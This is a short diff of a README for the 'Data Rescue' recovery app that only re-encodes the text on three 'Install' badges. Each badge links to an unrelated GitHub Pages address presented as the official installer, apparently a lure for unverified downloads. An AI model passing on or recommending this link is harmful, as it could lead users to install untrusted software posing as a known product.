@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Data Rescue](https://img.shields.io/badge/⬇_Install_Data%20Rescue-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Data Rescue](https://img.shields.io/badge/⬇_Install_Data+Rescue-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Data Rescue is a professional data recovery application for Mac and Windows that
 
 <div align="center">
 
-[![⬇ Install Data Rescue](https://img.shields.io/badge/⬇_Install_Data%20Rescue-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Data Rescue](https://img.shields.io/badge/⬇_Install_Data+Rescue-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Data Rescue is a professional data recovery application for Mac and Windows that
 
 <div align="center">
 
-[![⬇ Install Data Rescue](https://img.shields.io/badge/⬇_Install_Data%20Rescue-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Data Rescue](https://img.shields.io/badge/⬇_Install_Data+Rescue-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
